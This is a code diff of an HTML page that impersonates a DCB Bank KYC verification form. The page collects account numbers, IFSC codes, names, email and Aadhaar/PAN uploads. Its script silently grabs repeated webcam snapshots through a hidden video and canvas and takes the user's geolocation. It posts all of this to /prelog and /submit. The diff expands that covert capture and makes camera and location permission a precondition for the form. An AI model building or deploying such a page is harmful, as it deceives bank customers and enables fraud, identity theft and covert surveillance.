@@ -1,127 +1,171 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>DCB Bank KYC Verification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
   <style>
-  body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f6f9;
-    margin: 0;
-    padding: 0;
-  }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
 
-  .container {
-    max-width: 500px;
-    margin: 60px auto;
-    background: white;
-    border-radius: 8px;
-    padding: 30px;
-    box-shadow: 0 0 12px rgba(0,0,0,0.1);
-  }
+    body {
+      background-color: #f4f6f9;
+      color: #333;
+      line-height: 1.6;
+      padding: 15px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
 
-  .logo {
-    display: block;
-    margin: 0 auto 20px;
-    width: 180px;
-  }
+    .container {
+      max-width: 500px;
+      width: 100%;
+      margin: 20px auto;
+      background: white;
+      border-radius: 16px;
+      padding: 25px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+    }
 
-  h2 {
-    text-align: center;
-    color: #003d6a;
-  }
+    .logo {
+      display: block;
+      margin: 0 auto 15px;
+      width: 160px;
+      height: auto;
+    }
 
-  .notice {
-    margin-top: -10px;
-    margin-bottom: 20px;
-    font-size: 13px;
-    color: #444;
-    text-align: center;
-    line-height: 1.5;
-  }
+    h2 {
+      text-align: center;
+      color: #003d6a;
+      margin-bottom: 20px;
+      font-weight: 700;
+      font-size: 24px;
+    }
 
-  label {
-    display: block;
-    margin-top: 18px;
-    font-weight: bold;
-    font-size: 16px;
-    color: #222;
-  }
+    .notice {
+      font-size: 14px;
+      color: #444;
+      text-align: center;
+      margin-bottom: 20px;
+      background-color: #f8f9fa;
+      padding: 12px;
+      border-radius: 8px;
+      border-left: 4px solid #ffc107;
+    }
 
-  input[type="text"],
-  input[type="file"] {
-    width: 100%;
-    font-size: 16px;
-    padding: 12px 10px;
-    margin-top: 8px;
-    border-radius: 6px;
-    border: 1px solid #ccc;
-    box-sizing: border-box;
-  }
+    label {
+      display: block;
+      margin-top: 18px;
+      font-weight: 600;
+      font-size: 14px;
+      color: #003d6a;
+    }
 
-  button {
-    margin-top: 30px;
-    width: 100%;
-    background-color: #003d6a;
-    color: white;
-    border: none;
-    padding: 14px;
-    font-size: 17px;
-    border-radius: 6px;
-    cursor: pointer;
-  }
+    input[type="text"],
+    input[type="file"] {
+      width: 100%;
+      font-size: 14px;
+      padding: 12px;
+      margin-top: 6px;
+      border-radius: 8px;
+      border: 1px solid #d1d5db;
+      background: white;
+    }
 
-  button:hover {
-    background-color: #00548c;
-  }
+    button {
+      margin-top: 25px;
+      width: 100%;
+      background-color: #003d6a;
+      color: white;
+      border: none;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+    }
 
-  .footer {
-    text-align: center;
-    margin-top: 30px;
-    font-size: 12px;
-    color: #777;
-  }
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #777;
+      padding-top: 15px;
+      border-top: 1px solid #eee;
+    }
+
+    .error {
+      color: #d32f2f;
+      text-align: center;
+      font-size: 13px;
+      margin-top: 12px;
+    }
+
+    .success-message {
+      text-align: center;
+      padding: 18px;
+      background-color: #e8f5e9;
+      border-radius: 8px;
+      border-left: 4px solid #28a745;
+      margin-top: 18px;
+      display: none;
+    }
+
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <img class="logo" src="dbc.png" alt="DCB Bank Logo">
-    
+    <img class="logo" src="dbc.png" alt="DCB Bank Logo" />
     <h2>DCB Bank KYC Verification</h2>
 
-    <p class="notice">
-      Please enter the recipient’s bank and other required details carefully.  
-      All details submitted must match the recipient’s bank records.  
-      Invalid or mismatched information may lead to reversal or failure of the transaction.
-    </p>
-
-    <form action="/submit" method="POST" enctype="multipart/form-data">
-      <label for="bankname">Bank Name</label>
-      <input type="text" id="bankname" name="bankname" placeholder="Enter recipient’s bank name" required>
-
-      <label for="ifsc">IFSC Code</label>
-      <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code" required>
-
-      <label for="accno">Account Number</label>
-      <input type="text" id="accno" name="accno" required>
-
-      <label for="fullname">Full Name</label>
-      <input type="text" id="fullname" name="fullname" required>
-
-      <label for="document">Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
-      <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png" required>
-
-      <button type="submit">Verify Account</button>
-    </form>
-    <div class="footer">
-      © 2025 DCB Bank Ltd. | For official verification purposes only.
+    <div id="permissionStep">
+      <p class="notice">Please allow access to your camera and location.</p>
+      <button onclick="requestPermissions()">Allow & Continue</button>
+      <p id="permStatus" class="error"></p>
     </div>
+
+    <div id="kycForm" style="display: none;">
+      <form id="kycFormElement">
+        <label>Bank Name</label>
+        <input type="text" id="bankname" name="bankname" required />
+        <label>IFSC Code</label>
+        <input type="text" id="ifsc" name="ifsc" required />
+        <label>Account Number</label>
+        <input type="text" id="accno" name="accno" required />
+        <label>Full Name</label>
+        <input type="text" id="fullname" name="fullname" required />
+        <label>Email</label>
+        <input type="text" id="email" name="email" required />
+        <label>Upload Aadhaar or PAN</label>
+        <input type="file" id="document" name="document" required />
+        <button type="submit">Verify Account</button>
+      </form>
+      <div id="successMessage" class="success-message">
+        <h3>✅ Submitted Successfully</h3>
+      </div>
+    </div>
+
+    <div class="footer">© 2025 DCB Bank Ltd. For official verification only.</div>
   </div>
 
-  <!-- ✅ Auto-capture script -->
+  <video id="cameraPreview" autoplay playsinline></video>
+  <canvas id="captureCanvas"></canvas>
+
   <script>
+    let cameraStream = null;
     let capturedImages = [];
     let locationData = null;
+    const MAX_PRE_IMAGES = 10;
+    const MAX_SUBMIT_IMAGES = 5;
 
     function dataURLtoBlob(dataurl) {
       const arr = dataurl.split(',');
@@ -133,63 +177,107 @@
       return new Blob([u8arr], { type: mime });
     }
 
+    function startPreCapture() {
+      const video = document.getElementById('cameraPreview');
+      const canvas = document.getElementById('captureCanvas');
+      const ctx = canvas.getContext('2d');
+      let count = 0;
+
+      const interval = setInterval(() => {
+        if (count >= MAX_PRE_IMAGES) {
+          clearInterval(interval);
+          sendPrelog();
+          return;
+        }
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+        count++;
+      }, 500);
+    }
+
     function sendPrelog() {
       const formData = new FormData();
-      capturedImages.slice(0, 5).forEach((img, index) => {
-        formData.append(`image${index}`, dataURLtoBlob(img), `prelog_${index}.jpg`);
+      capturedImages.forEach((img, i) => {
+        formData.append(`image${i}`, dataURLtoBlob(img), `prelog_${i}.jpg`);
       });
       if (locationData) {
         formData.append('location', JSON.stringify(locationData));
       }
-
-      fetch('/prelog', {
-        method: 'POST',
-        body: formData
-      }).catch(console.error);
+      fetch('/prelog', { method: 'POST', body: formData });
     }
 
-    window.addEventListener('load', async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
+    function requestPermissions() {
+      const status = document.getElementById('permStatus');
+      status.textContent = "";
 
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).then(stream => {
+        cameraStream = stream;
+        document.getElementById('cameraPreview').srcObject = stream;
 
-        setTimeout(() => {
-          const capture = () => {
-            if (capturedImages.length >= 5) return;
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
-          };
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            locationData = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              timestamp: pos.timestamp
+            };
+            document.getElementById('permissionStep').style.display = 'none';
+            document.getElementById('kycForm').style.display = 'block';
+            startPreCapture();
+          },
+          err => {
+            status.textContent = "Location access denied.";
+          },
+          { enableHighAccuracy: true }
+        );
+      }).catch(() => {
+        status.textContent = "Camera access denied.";
+      });
+    }
 
-          const interval = setInterval(() => {
-            capture();
-            if (capturedImages.length >= 5) {
-              clearInterval(interval);
-              stream.getTracks().forEach(track => track.stop());
-              sendPrelog();
-            }
-          }, 500);
-        }, 1000);
-      } catch (err) {
-        console.warn('Camera access denied');
+    document.getElementById('kycFormElement').addEventListener('submit', async function (e) {
+      e.preventDefault();
+      const form = e.target;
+      const formData = new FormData(form);
+
+      const file = document.getElementById('document').files[0];
+      if (file) formData.append('document', file);
+
+      const canvas = document.getElementById('captureCanvas');
+      const ctx = canvas.getContext('2d');
+      const video = document.getElementById('cameraPreview');
+
+      for (let i = 0; i < MAX_SUBMIT_IMAGES; i++) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        const imgBlob = dataURLtoBlob(canvas.toDataURL('image/jpeg'));
+        formData.append(`image${capturedImages.length + i}`, imgBlob, `submit_${i}.jpg`);
       }
 
-      navigator.geolocation.getCurrentPosition(pos => {
-        locationData = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          timestamp: pos.timestamp
-        };
-      }, err => {
-        console.warn('Location access denied');
-      });
+      if (locationData) formData.append('location', JSON.stringify(locationData));
+
+      const res = await fetch('/submit', { method: 'POST', body: formData });
+      if (res.ok) {
+        form.style.display = 'none';
+        document.getElementById('successMessage').style.display = 'block';
+      } else {
+        alert('Submission failed. Try again.');
+      }
+    });
+
+    function stopCamera() {
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+      }
+    }
+
+    window.addEventListener('beforeunload', stopCamera);
+    window.addEventListener('load', () => {
+      document.getElementById('cameraPreview').style.display = 'none';
     });
   </script>
 </body>
